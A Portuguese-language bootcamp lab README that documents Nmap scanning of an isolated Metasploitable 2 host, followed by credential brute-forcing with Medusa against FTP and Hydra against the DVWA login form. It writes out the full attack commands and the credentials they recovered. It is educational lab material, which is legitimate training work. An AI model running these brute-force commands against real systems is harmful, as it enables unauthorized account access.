# 🛡️ Laboratório de Ataques de Força Bruta com Parrot OS, Medusa e Hydra

Projeto educacional executado em ambiente controlado para aprendizado de técnicas de cibersegurança ofensiva, com foco em varredura de rede, enumeração de serviços, criação de wordlists e ataques de força bruta (Brute Force).

## 🧠 Sobre o Projeto

Este laboratório foi desenvolvido como parte do **Bootcamp de Cibersegurança na Digital Innovation One (DIO)**.

Os principais objetivos deste projeto são:
- Realizar a varredura da rede e enumeração de serviços ativos utilizando o **Nmap**;
- Analisar o comportamento de formulários web (DVWA) e mapear seus parâmetros de requisição;
- Criar wordlists personalizadas no terminal Linux;
- Executar ataques de força bruta automatizados utilizando **Medusa** (FTP) e **Hydra** (HTTP POST Form);
- Documentar processos técnicos e evidências de forma estruturada no GitHub.

> ⚠️ **Aviso Ético:** Todos os testes descritos neste repositório foram realizados exclusivamente em ambientes isolados, vulneráveis e autorizados (Metasploitable 2 e DVWA). Nenhum ataque foi executado contra sistemas reais ou externos.

---

## 🛠️ Ambiente de Testes

| Máquina | Sistema Operacional | Função | IP no Laboratório |
| :--- | :--- | :--- | :--- |
| **Atacante** | Parrot Security OS | Máquina de Auditoria | Rede Interna (`192.168.85.0/24`) |
| **Alvo** | Metasploitable 2 (Linux) | Servidor Vulnerável | `192.168.85.131` |
| **Aplicação Web** | DVWA (Damn Vulnerable Web App) | Aplicação Web Vulnerável | `http://192.168.85.131/dvwa/login.php` |

- **Modo de Rede:** Rede Interna / Host-Only Adapter (sem exposição à internet).

---

## 🔎 1. Varredura da Rede e Enumeração

### Descoberta de Hosts na Rede
Inicialmente, realizou-se uma varredura completa de portas na sub-rede para identificar o host ativo:

```bash
nmap -p- 192.168.85.0/24
```

### Enumeração de Portas no Alvo (`192.168.85.131`)
Com o IP do Metasploitable 2 identificado, executou-se a varredura de portas abertas:

```bash
nmap 192.168.85.131
```

**Principais portas e serviços identificados:**
- `21/tcp` — **ftp**
- `22/tcp` — **ssh**
- `23/tcp` — **telnet**
- `80/tcp` — **http** (Servidor web hospedando TWiki, phpMyAdmin, Mutillidae, DVWA e WebDAV)
- `139/tcp` e `445/tcp` — **netbios-ssn / microsoft-ds** (SMB)
- `2121/tcp` — **ccproxy-ftp**
- `3306/tcp` — **mysql**
- `5432/tcp` — **postgresql**

![Varredura Nmap](images/nmap.png)
![Página Inicial Metasploitable 2](images/metasploitable.png)

---

## 📄 2. Criação das Wordlists (`user.txt` e `pass.txt`)

Para os testes de autenticação, em vez de utilizar listas extensas prontas (como `rockyou.txt` ou `SecLists`), foram criadas wordlists personalizadas diretamente pelo terminal utilizando o editor `nano`:

```bash
nano user.txt
```
*(Inserido um nome de usuário por linha: `user`, `msfadmin`, `admin`, `root`. Salvo com `Ctrl + O`, `Enter` e fechado com `Ctrl + X`)*

O mesmo procedimento foi repetido para a lista de senhas (`123456`, `password`, `qwerty`, `msfadmin`):

```bash
nano pass.txt
```

Em seguida, aplicaram-se permissões aos arquivos:

```bash
chmod +x user.txt pass.txt
```

---

## 🔐 3. Ataque de Força Bruta em FTP (Medusa)

Com o serviço FTP ativo na porta `21/tcp`, executou-se o ataque de força bruta utilizando o **Medusa** com 6 threads simultâneas (`-t 6`):

```bash
medusa -h 192.168.85.131 -U user.txt -P pass.txt -M ftp -t 6
```

### ✅ Resultado
O Medusa testou as combinações das listas e identificou com sucesso as credenciais válidas (`msfadmin:msfadmin`).

---

## 🌐 4. Análise e Ataque em Aplicação Web — DVWA (Hydra)

### Mapeamento do Formulário de Login
Ao acessar `http://192.168.85.131/dvwa/login.php`, realizou-se um teste manual de login com o inspetor de rede do navegador (`F12` -> aba **Network** -> **Request**) aberto para observar como a requisição HTTP `POST` é enviada ao servidor.

**Campos identificados na requisição:**
- **Usuário:** `username`
- **Senha:** `password`
- **Botão de envio:** `Login=Login`
- **Resposta de falha na página:** `Login failed`

![Inspeção dos campos do formulário DVWA](images/dvwa-request.png)

### 📌 Nota Técnica: Medusa vs. Hydra no `login.php`
Durante os testes no formulário `/dvwa/login.php`, observou-se que o módulo `web-form` do **Medusa (v2.3)** não segue redirecionamentos HTTP (`302 Found`), encerrando as tentativas com `error code 302` antes de validar o corpo da resposta HTML.

Para contornar essa limitação técnica e concluir o ataque automatizado via `POST` diretamente na página de login, utilizou-se o **THC-Hydra**, que acompanha redirecionamentos HTTP nativamente:

```bash
hydra -L user.txt -P pass.txt 192.168.85.131 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 6 -V -f
```

### ✅ Resultado
O Hydra realizou as tentativas de combinação e identificou rapidamente a credencial válida **`admin` / `password`** na porta `80` (`[80][http-post-form] host: 192.168.85.131 login: admin password: password`).

![Resultado Hydra DVWA](images/hydra-dvwa.png)

---

## 📁 Estrutura do Repositório

```text
dio-parrot-medusa-bruteforce-lab/
│
├── README.md
├── images/
│   ├── nmap.png
│   ├── metasploitable.png
│   ├── dvwa-request.png
│   └── hydra-dvwa.png
└── wordlists/
    ├── user.txt
    └── pass.txt
```

---

## 📘 Conclusões e Aprendizados

Este laboratório proporcionou experiência prática na execução de varreduras de rede, criação de wordlists e testes de força bruta em ambiente controlado. Além do uso das ferramentas (**Nmap**, **Medusa** e **Hydra**), a análise do tráfego HTTP demonstrou como mapear parâmetros de formulários (`POST`) e a importância de compreender o funcionamento dos protocolos (como códigos de redirecionamento `302`) para escolher a ferramenta adequada a cada cenário.

---

## 📚 Referências

- [Parrot Security OS](https://www.parrotsec.org/)
- [Medusa — Documentação Oficial](http://www.foofus.net/jmk/medusa/medusa.html)
- [THC-Hydra — Repositório Oficial](https://github.com/vanhauser-thc/thc-hydra)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Nmap — Manual Oficial](https://nmap.org/book/)

---

✍️ **Autor:** [Seu Nome Aqui]  
📌 *Projeto educacional desenvolvido para o Bootcamp da Digital Innovation One (DIO).*
